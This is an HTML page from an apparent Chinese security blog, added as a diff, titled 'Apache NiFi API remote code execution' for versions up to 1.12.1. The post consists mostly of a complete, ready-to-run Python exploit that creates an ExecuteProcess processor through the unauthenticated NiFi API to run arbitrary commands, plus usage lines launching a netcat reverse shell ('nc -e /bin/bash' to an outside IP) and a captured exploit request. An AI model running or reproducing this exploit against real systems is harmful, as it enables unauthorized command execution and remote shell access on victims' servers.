@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Apache NiFi API远程代码执行漏洞简述一个易用、强大、可靠的数据处理与分发系统。基于Web图形界面，通过拖拽、连接、配置完成基于流程的编程，实现数据采集等功能 影响版本  ≤1.12.1  漏洞详情EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache NiFi API远程代码执行">
+<meta property="og:url" content="http://example.com/2021/01/22/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache_NiFi_API%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Apache NiFi API远程代码执行漏洞简述一个易用、强大、可靠的数据处理与分发系统。基于Web图形界面，通过拖拽、连接、配置完成基于流程的编程，实现数据采集等功能 影响版本  ≤1.12.1  漏洞详情EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-01-22T10:11:00.000Z">
+<meta property="article:modified_time" content="2021-02-03T03:22:53.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Alibaba">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/01/22/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache_NiFi_API%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Apache NiFi API远程代码执行 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/22/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache_NiFi_API%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Apache NiFi API远程代码执行
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-22 18:11:00" itemprop="dateCreated datePublished" datetime="2021-01-22T18:11:00+08:00">2021-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-03 11:22:53" itemprop="dateModified" datetime="2021-02-03T11:22:53+08:00">2021-02-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Apache-NiFi-API远程代码执行"><a href="#Apache-NiFi-API远程代码执行" class="headerlink" title="Apache NiFi API远程代码执行"></a>Apache NiFi API远程代码执行</h2><h3 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h3><p>一个易用、强大、可靠的数据处理与分发系统。基于Web图形界面，通过拖拽、连接、配置完成基于流程的编程，实现数据采集等功能</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
+<li> ≤1.12.1</li>
+</ul>
+<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">import requests as req</span><br><span class="line"></span><br><span class="line">class Exp:</span><br><span class="line">    def __init__(self, url):</span><br><span class="line">        self.url &#x3D; url</span><br><span class="line"></span><br><span class="line">    def check_is_vul(self):</span><br><span class="line">        url &#x3D; self.url + &quot;&#x2F;nifi-api&#x2F;access&#x2F;config&quot;</span><br><span class="line">        try:</span><br><span class="line">            res &#x3D; req.get(url&#x3D;url, verify&#x3D;False)</span><br><span class="line">            data &#x3D; res.json()</span><br><span class="line">            return not data[&quot;config&quot;][&quot;supportsLogin&quot;]</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    def clean_up(self, p_id):</span><br><span class="line">        url &#x3D; self.url + &quot;&#x2F;nifi-api&#x2F;processors&#x2F;&quot; + p_id</span><br><span class="line">        data &#x3D; &#123;&#39;revision&#39;: &#123;&#39;clientId&#39;: &#39;x&#39;, &#39;version&#39;: 1&#125;, &#39;state&#39;: &#39;STOPPED&#39;&#125;</span><br><span class="line">        req.put(url&#x3D;url + &quot;&#x2F;run-status&quot;, data&#x3D;json.dumps(data), verify&#x3D;False)</span><br><span class="line">        req.delete(url + &quot;&#x2F;threads&quot;, verify&#x3D;False)</span><br><span class="line"></span><br><span class="line">    def exploit(self, cmd):</span><br><span class="line">        g_id &#x3D; self.fetch_process_group()</span><br><span class="line">        if g_id:</span><br><span class="line">            p_id &#x3D; self.create_process(g_id)</span><br><span class="line">            if p_id:</span><br><span class="line">                self.run_cmd(p_id&#x3D;p_id, cmd&#x3D;cmd)</span><br><span class="line">                self.clean_up(p_id&#x3D;p_id)</span><br><span class="line"></span><br><span class="line">    def run_cmd(self, p_id, cmd):</span><br><span class="line">        url &#x3D; self.url + &quot;&#x2F;nifi-api&#x2F;processors&#x2F;&quot; + p_id</span><br><span class="line">        cmd &#x3D; cmd.split(&quot; &quot;)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &#39;component&#39;: &#123;</span><br><span class="line">                &#39;config&#39;: &#123;</span><br><span class="line">                    &#39;autoTerminatedRelationships&#39;: [&#39;success&#39;],</span><br><span class="line">                    &#39;properties&#39;: &#123;</span><br><span class="line">                        &#39;Command&#39;: cmd[0],</span><br><span class="line">                        &#39;Command Arguments&#39;: &quot; &quot;.join(cmd[1:]),</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#39;schedulingPeriod&#39;: &#39;3600 sec&#39;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#39;id&#39;: p_id,</span><br><span class="line">                &#39;state&#39;: &#39;RUNNING&#39;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#39;revision&#39;: &#123;&#39;clientId&#39;: &#39;x&#39;, &#39;version&#39;: 1&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        print(data)</span><br><span class="line">        headers &#x3D; &#123;</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application&#x2F;json&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">        res &#x3D; req.put(url&#x3D;url, data&#x3D;json.dumps(data), headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">        return res.json()</span><br><span class="line"></span><br><span class="line">    def fetch_process_group(self):</span><br><span class="line">        url &#x3D; self.url + &quot;&#x2F;nifi-api&#x2F;process-groups&#x2F;root&quot;</span><br><span class="line">        try:</span><br><span class="line">            res &#x3D; req.get(url&#x3D;url, verify&#x3D;False)</span><br><span class="line">            data &#x3D; res.json()[&quot;id&quot;]</span><br><span class="line">            return data</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">    def create_process(self, process_group_id):</span><br><span class="line">        url &#x3D; self.url + &quot;&#x2F;nifi-api&#x2F;process-groups&#x2F;&quot; + process_group_id + &quot;&#x2F;processors&quot;</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &#39;component&#39;: &#123;</span><br><span class="line">                &#39;type&#39;: &#39;org.apache.nifi.processors.standard.ExecuteProcess&#39;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#39;revision&#39;: &#123;</span><br><span class="line">                &#39;version&#39;: 0</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        headers &#x3D; &#123;</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application&#x2F;json&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            res &#x3D; req.post(url&#x3D;url, data&#x3D;json.dumps(data), headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">            return res.json()[&quot;id&quot;]</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) !&#x3D; 3:</span><br><span class="line">        print(&quot;rce.py url cmd&quot;)</span><br><span class="line">    else:</span><br><span class="line">        url &#x3D; sys.argv[1]  # http:&#x2F;&#x2F;192.168.1.1:8080</span><br><span class="line">        cmd &#x3D; sys.argv[2]  # nc -e &#x2F;bin&#x2F;bash 192.168.1.129 1234</span><br><span class="line">        e &#x3D; Exp(url)</span><br><span class="line">        e.exploit(cmd)</span><br></pre></td></tr></table></figure>
+
+<p>监听端口<br>nc -lvp 6666</p>
+<p>执行命令<br>python exp.py <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> “nc -e /bin/bash 192.168.1.102 6666”<br><strong>需要目标机上有netcat 并且支持-e选项</strong></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;nifi-api&#x2F;processors&#x2F;004e7b50-0177-1000-475a-ab13f94d6527 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.189.128:8080</span><br><span class="line">User-Agent: python-requests&#x2F;2.25.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 305</span><br><span class="line"></span><br><span class="line">&#123;&quot;component&quot;: &#123;&quot;config&quot;: &#123;&quot;autoTerminatedRelationships&quot;: [&quot;success&quot;], &quot;properties&quot;: &#123;&quot;Command&quot;: &quot;nc&quot;, &quot;Command Arguments&quot;: &quot;-e &#x2F;bin&#x2F;bash 192.168.189.134 1234&quot;&#125;, &quot;schedulingPeriod&quot;: &quot;3600 sec&quot;&#125;, &quot;id&quot;: &quot;004e7b50-0177-1000-475a-ab13f94d6527&quot;, &quot;state&quot;: &quot;RUNNING&quot;&#125;, &quot;revision&quot;: &#123;&quot;clientId&quot;: &quot;x&quot;, &quot;version&quot;: 1&#125;&#125;HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Thu, 14 Jan 2021 09:51:19 GMT</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Security-Policy: frame-ancestors &#39;self&#39;</span><br><span class="line">X-XSS-Protection: 1; mode&#x3D;block</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Cache-Control: private, no-cache, no-store, no-transform</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 1745</span><br><span class="line">Server: Jetty(9.4.26.v20200117)</span><br><span class="line"></span><br><span class="line">...........X.n.8...B&#x2F;&#123;..H....H..k q..M....$...&amp;U..#.....([...A.-Z .....3.a...-..J..oA*8.v....)..K.k.a&#x2F;...;...3</span><br><span class="line">b*....4.s&#x2F;.h.E..,9..Q|v...(.....&gt;M....8;&#x3D;9&lt;.....&lt;........a|z....a|x&gt;8....	&#123;.i..</span><br><span class="line">.Rf........p......0....	Q.L&#x2F;....wV*..B.V.....4........Y...?.\-</span><br><span class="line">%...&#125;.......Ve1....O.$i......Er._.dy.K.;....4.ybii.C......u.g!-h:g!..n....2.:.wl.Rf..v3.u.</span><br><span class="line">.PmyNS. pYj..%.m..1.3...........p.......B...C.9&#x2F;..o..L...2fR.....R..j..3.V..[..!.0..q.*b....g...j...t.bH.).Bik....m...r.....YB..5... ...do.M....</span><br><span class="line">..X3...W53V...l.g..,.n.+1...|.26nYx......&#x3D;.P..%..&amp;b.</span><br><span class="line">.Ei..k.5[8...........7....Q.l.9.a..........Z, ......&#39;....&#125;.N.g. .. .fN:.|tL...c.s...R.:o.j...Y.1...h.4.XH..&lt;......_.Fr......f&#123;r.._@.b.&quot;....@.N.k&quot;5+..M!h5.Y..lR..&#123;...1......F....&#x2F;.s.oi......	.^..A.....g,..n........4L.f..K..tg&#123;.....H...5I...	...g..........&#x3D;..\...rV.......G...p.f@Q].&#123;)*.rO..Ql.^....Av</span><br><span class="line">.......EUW,kc..,g$..j....m......@.vI1)-jU&amp;S..x.p.:S%...-.e..m.....v&#x3D;....l..+.@:..t..#. 8..&gt;...%g&#125;]J..&#96;z@5+.&lt;..lI...	..G(I.V...A..r...4.....Yq..	f..%.Jr.j.&#125;)L.@i.</span><br><span class="line">..:pg.......w@.+....w@....V...,...M......n</span><br><span class="line">..(...YG...........2.e...kk..&#39;........dR..&amp;.&#x2F;..5?...i....[..5..1..</span><br><span class="line">...g.$W.. .2_..d...V..AZ</span><br><span class="line">....L.y)\..9.S.c..</span><br><span class="line">G,&#96;.E\..U...t.D.</span><br><span class="line">.......D9.\&#x3D;RQ......Za.9A&#x3D;It....h...,...|.u......41,;1.x......B]3kW.....;-&#x3D;k..I....Wg.q.%+.e.....s..Z...l..f.5X&#123;..h.W....4P.%..v&#96;.l].H&#125;..&#x3D;&gt;z...k.SH..(A	.up.t.....&#x3D;.B~z.x-.p..&#39;CV</span><br><span class="line">...i.p.&lt;:.&quot;8,...)4*8..B*</span><br><span class="line">.n.....G7.v.&#96;D....DLRa..&#x3D;..5N+.D...~.y..2.6H..1..;.Q..v..eDn*........2....^h. v..f..G0p...LS.7p.9.Z.C.n.......7..t..o........v9.Av.g.H.......K.t+....#...&lt;^......;#2.).....O....w.k...yV......O4.&#39;..........s,. &gt;......\M.x..f.....I..t^....y...............&quot;......~..&#39;P.(q.._5..Z....r............-.Q..4....cd7..._.)....l.&#125;&#125;tT....?.......M.x.M.....u$.V.&gt;.A.....&#x3D;.....V;...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考文档：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/imjdl/Apache-NiFi-Api-RCE">https://github.com/imjdl/Apache-NiFi-Api-RCE</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Alibaba/" rel="tag"># Alibaba</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%5BCVE-2020-3019%5Dlanproxy_%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" rel="prev" title="lanproxy 目录遍历漏洞（CVE-2020-3019）POC">
+      <i class="fa fa-chevron-left"></i> lanproxy 目录遍历漏洞（CVE-2020-3019）POC
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/01/26/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nacos_%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3/" rel="next" title="Nacos 未授权接口">
+      Nacos 未授权接口 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-NiFi-API%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">1.</span> <span class="nav-text">Apache NiFi API远程代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞简述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞详情</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP"><span class="nav-number">1.3.1.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">1.4.1.</span> <span class="nav-text">流量分析</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
